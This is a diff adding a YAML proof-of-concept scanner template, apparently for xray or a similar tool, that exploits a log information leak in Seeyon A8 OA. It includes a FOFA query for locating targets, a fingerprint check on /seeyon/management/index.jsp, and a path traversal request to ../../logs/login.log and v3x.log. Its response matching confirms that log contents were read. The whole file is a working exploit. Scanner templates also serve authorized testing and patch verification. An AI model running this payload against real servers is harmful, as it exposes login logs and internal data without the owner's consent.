@@ -1,0 +1,24 @@
+id: poc-yaml-seeyon-a8-log-info-leak
+info:
+  name: 致远OA logs日志信息泄露漏洞
+  severity: medium
+  tags:
+  - 信息泄露
+  finger: 致远OA
+  fofa: app="致远互联-OA"
+variables:
+  log: 'login.log
+
+    v3x.log'
+firstRequest:
+  method: GET
+  path: /seeyon/management/index.jsp
+  expression: 'status_code == 200 && contains(body,"Management")
+
+    '
+requests:
+- method: GET
+  path: /seeyon/management/index.jsp/../../logs/{{.log}}
+  expression: "status_code == 200 && \nmatches(body,`^\\d{4}-\\d{2}-\\d{2} \\d{2}:\\\
+    d{2}:\\d{2}`) &&\n!contains(body,\"<\")\n"
+transport: http
